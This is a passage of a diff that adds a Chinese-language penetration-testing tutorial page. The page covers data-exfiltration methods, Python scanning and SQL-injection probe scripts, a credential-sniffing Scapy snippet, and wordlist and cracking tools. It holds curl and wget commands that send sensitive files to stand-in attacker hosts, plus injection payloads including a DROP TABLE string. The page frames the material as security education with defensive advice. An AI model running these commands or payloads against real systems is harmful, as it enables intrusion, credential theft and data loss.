+curl -X POST -d @sensitive_data.txt https://attacker-server.com/collect
+python3 -m http.server 8080  # 攻击者服务器
+wget http://attacker-server:8080/upload --post-file=data.txt
+
+# 2. DNS 隧道（绕过严格的出站过滤）
+# 将数据编码到 DNS 查询的子域名中
+# 工具: dnscat2, iodine
+
+# 3. ICMP 隧道
+# 将数据嵌入 ICMP Echo 包
+# 工具: icmpsh, ptunnel
+
+# 4. 加密压缩后传输
+tar czf - /sensitive/dir | openssl enc -aes-256-cbc -pass pass:key | \
+  curl -X POST --data-binary @- https://attacker.com/upload</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">红队 vs 蓝队视角</div>
+      <p>了解后渗透技术不仅是为了攻击——更重要的是<strong>防御</strong>。作为安全工程师，你需要：</p>
+      <ul>
+        <li>部署 EDR（端点检测与响应）来检测 LinPEAS/WinPEAS 等工具的特征</li>
+        <li>监控异常的横向移动流量（如大量 SMB/WMI 调用）</li>
+        <li>配置 DLP（数据防泄漏）系统监控数据外传</li>
+        <li>实施最小权限原则减少攻击面</li>
+      </ul>
+    </div>
+
+    <!-- Section 6: Python 脚本 -->
+    <h2 id="python-scripting">6. Python 安全脚本编写</h2>
+
+    <h3>6.1 使用 Requests 库</h3>
+    <pre><code>import requests
+from concurrent.futures import ThreadPoolExecutor
+
+# === 基本漏洞探测脚本 ===
+
+def check_sql_injection(url, param):
+    """测试简单的 SQL 注入"""
+    payloads = ["'", "\"", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--"]
+
+    for payload in payloads:
+        params = {param: payload}
+        try:
+            response = requests.get(url, params=params, timeout=10)
+            # 检测错误信息泄露
+            error_signs = ['SQL syntax', 'mysql_', 'ORA-', 'PostgreSQL', 'sqlite3']
+            for sign in error_signs:
+                if sign.lower() in response.text.lower():
+                    print(f"[!] 可能存在 SQL 注入: {url}?{param}={payload}")
+                    print(f"    错误特征: {sign}")
+                    return True
+        except requests.exceptions.RequestException as e:
+            print(f"[-] 请求失败: {e}")
+
+    return False
+
+# === 目录枚举脚本 ===
+
+def directory_brute(base_url, wordlist_path, threads=20):
+    """多线程目录枚举"""
+    found = []
+
+    with open(wordlist_path, 'r') as f:
+        paths = [line.strip() for line in f if line.strip()]
+
+    def check_path(path):
+        url = f"{base_url}/{path}"
+        try:
+            resp = requests.get(url, timeout=5, allow_redirects=False)
+            if resp.status_code in [200, 301, 302, 403]:
+                print(f"[{resp.status_code}] {url}")
+                found.append((url, resp.status_code))
+        except:
+            pass
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        executor.map(check_path, paths)
+
+    return found
+
+# === 子域名枚举 ===
+
+def subdomain_enum(domain, wordlist_path):
+    """子域名暴力枚举"""
+    found_subdomains = []
+
+    with open(wordlist_path, 'r') as f:
+        subdomains = [line.strip() for line in f if line.strip()]
+
+    for sub in subdomains:
+        url = f"http://{sub}.{domain}"
+        try:
+            resp = requests.get(url, timeout=3)
+            print(f"[+] 发现: {sub}.{domain} [{resp.status_code}]")
+            found_subdomains.append(f"{sub}.{domain}")
+        except requests.exceptions.ConnectionError:
+            pass
+        except requests.exceptions.Timeout:
+            pass
+
+    return found_subdomains
+
+# 使用示例
+if __name__ == "__main__":
+    # SQL 注入测试
+    check_sql_injection("http://testsite.com/products", "id")
+
+    # 目录枚举
+    directory_brute("http://testsite.com", "/usr/share/wordlists/dirb/common.txt")</code></pre>
+
+    <h3>6.2 使用 Scapy 进行网络层操作</h3>
+    <pre><code>from scapy.all import *
+
+# === 端口扫描器 ===
+
+def syn_scan(target, ports):
+    """SYN 半开扫描（需要 root 权限）"""
+    open_ports = []
+
+    for port in ports:
+        # 构造 SYN 包
+        pkt = IP(dst=target) / TCP(dport=port, flags='S')
+        # 发送并等待响应
+        resp = sr1(pkt, timeout=1, verbose=0)
+
+        if resp is not None:
+            if resp.haslayer(TCP):
+                if resp[TCP].flags == 0x12:  # SYN-ACK
+                    open_ports.append(port)
+                    # 发送 RST 关闭连接
+                    rst = IP(dst=target) / TCP(dport=port, flags='R')
+                    send(rst, verbose=0)
+
+    return open_ports
+
+# === ARP 扫描（局域网主机发现）===
+
+def arp_scan(network):
+    """ARP 扫描局域网"""
+    # 构造 ARP 请求
+    arp_request = ARP(pdst=network)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = broadcast / arp_request
+
+    # 发送并接收响应
+    answered, unanswered = srp(packet, timeout=2, verbose=0)
+
+    hosts = []
+    for sent, received in answered:
+        hosts.append({
+            'ip': received.psrc,
+            'mac': received.hwsrc
+        })
+        print(f"[+] {received.psrc:16s} {received.hwsrc}")
+
+    return hosts
+
+# === 简单的 Packet Sniffer ===
+
+def packet_callback(packet):
+    """数据包回调函数"""
+    if packet.haslayer(TCP):
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        src_port = packet[TCP].sport
+        dst_port = packet[TCP].dport
+        print(f"TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
+
+    # 检测明文密码
+    if packet.haslayer(Raw):
+        payload = packet[Raw].load.decode('utf-8', errors='ignore')
+        keywords = ['user', 'pass', 'login', 'password']
+        for keyword in keywords:
+            if keyword in payload.lower():
+                print(f"[!] 可能的凭据: {payload[:200]}")
+                break
+
+# 启动嗅探
+# sniff(filter="tcp", prn=packet_callback, count=100)
+
+# === ICMP Ping 扫描 ===
+
+def ping_sweep(network_prefix, start=1, end=254):
+    """ICMP Ping 扫描"""
+    alive_hosts = []
+
+    for i in range(start, end + 1):
+        target = f"{network_prefix}.{i}"
+        pkt = IP(dst=target) / ICMP()
+        resp = sr1(pkt, timeout=0.5, verbose=0)
+
+        if resp is not None:
+            alive_hosts.append(target)
+            print(f"[+] {target} is alive")
+
+    return alive_hosts
+
+# 使用示例
+if __name__ == "__main__":
+    # SYN 扫描
+    target = "192.168.1.100"
+    ports = range(1, 1025)
+    open_ports = syn_scan(target, ports)
+    print(f"\n开放端口: {open_ports}")
+
+    # ARP 扫描
+    arp_scan("192.168.1.0/24")</code></pre>
+
+    <div class="info-box note">
+      <div class="box-title">Python 安全库推荐</div>
+      <table>
+        <thead>
+          <tr><th>库</th><th>用途</th><th>安装命令</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>requests</td><td>HTTP 请求</td><td><code>pip install requests</code></td></tr>
+          <tr><td>scapy</td><td>网络包构造与嗅探</td><td><code>pip install scapy</code></td></tr>
+          <tr><td>pwntools</td><td>CTF/二进制漏洞利用</td><td><code>pip install pwntools</code></td></tr>
+          <tr><td>paramiko</td><td>SSH 连接</td><td><code>pip install paramiko</code></td></tr>
+          <tr><td>beautifulsoup4</td><td>HTML 解析/爬虫</td><td><code>pip install beautifulsoup4</code></td></tr>
+          <tr><td>cryptography</td><td>加密/解密</td><td><code>pip install cryptography</code></td></tr>
+          <tr><td>impacket</td><td>网络协议（SMB等）</td><td><code>pip install impacket</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Section 7: Wordlists -->
+    <h2 id="wordlists">7. 字典与 Wordlists</h2>
+
+    <h3>7.1 SecLists - 安全测试字典集合</h3>
+    <p>SecLists 是渗透测试中最常用的字典集合，涵盖用户名、密码、URL、Fuzzing payload 等。</p>
+
+    <pre><code># 安装 SecLists
+sudo apt install seclists
+# 或手动克隆
+git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists</code></pre>
+
+    <table>
+      <thead>
+        <tr><th>类别</th><th>路径</th><th>说明</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>密码</td><td><code>Passwords/Common-Credentials/</code></td><td>常见密码，包含 rockyou.txt</td></tr>
+        <tr><td>用户名</td><td><code>Usernames/</code></td><td>常见用户名列表</td></tr>
+        <tr><td>Web 目录</td><td><code>Discovery/Web-Content/</code></td><td>目录和文件名字典</td></tr>
+        <tr><td>子域名</td><td><code>Discovery/DNS/</code></td><td>子域名枚举字典</td></tr>
+        <tr><td>Fuzzing</td><td><code>Fuzzing/</code></td><td>各类 Fuzzing payload</td></tr>
+        <tr><td>SQL 注入</td><td><code>Fuzzing/SQLi/</code></td><td>SQL 注入 payload</td></tr>
+        <tr><td>XSS</td><td><code>Fuzzing/XSS/</code></td><td>XSS payload 集合</td></tr>
+      </tbody>
+    </table>
+
+    <h3>7.2 常用字典文件</h3>
+    <pre><code># === 密码字典 ===
+/usr/share/wordlists/rockyou.txt                          # 1400万+ 真实密码
+/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+
+# === 目录枚举 ===
+/usr/share/seclists/Discovery/Web-Content/common.txt      # 通用目录
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  # 中等大小
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+/usr/share/wordlists/dirb/common.txt                      # dirb 默认字典
+
+# === 子域名 ===
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# === 参数名 ===
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+# === API 路径 ===
+/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt</code></pre>
+
+    <h3>7.3 自定义字典生成</h3>
+    <pre><code># CeWL - 从网站生成自定义字典
+cewl http://target.com -d 2 -m 5 -w custom_wordlist.txt
+# -d 爬取深度  -m 最小词长度  -w 输出文件
+
+# Crunch - 按规则生成字典
+crunch 8 8 -t @@@@%%%% -o wordlist.txt
+# 8位: 4字母 + 4数字
+
+# John the Ripper 规则
+john --wordlist=base.txt --rules=best64 --stdout > expanded.txt
+
+# Hashcat 规则
+hashcat --stdout -r /usr/share/hashcat/rules/best64.rule base.txt > expanded.txt
+
+# Python 生成字典
+python3 -c "
+import itertools
+chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+for combo in itertools.product(chars, repeat=4):
+    print('prefix_' + ''.join(combo))
+" > custom.txt</code></pre>
+
+    <div class="info-box success">
+      <div class="box-title">渗透测试工具总结</div>
+      <table>
+        <thead>
+          <tr><th>阶段</th><th>核心工具</th><th>补充工具</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>信息收集</td><td>Nmap, theHarvester</td><td>Shodan, Amass, Recon-ng</td></tr>
+          <tr><td>Web 扫描</td><td>Burp Suite, ffuf</td><td>ZAP, Nikto, gobuster</td></tr>
+          <tr><td>漏洞利用</td><td>Metasploit, SQLmap</td><td>XSStrike, searchsploit</td></tr>
+          <tr><td>后渗透</td><td>LinPEAS/WinPEAS</td><td>Impacket, Mimikatz</td></tr>
+          <tr><td>密码破解</td><td>Hashcat, John</td><td>Hydra, Medusa</td></tr>
+          <tr><td>报告</td><td>手动撰写</td><td>Dradis, Serpico</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="nav-footer">
+      <span></span>
+      <a href="02_CTF入门.html">下一篇: CTF 入门与实战 →</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
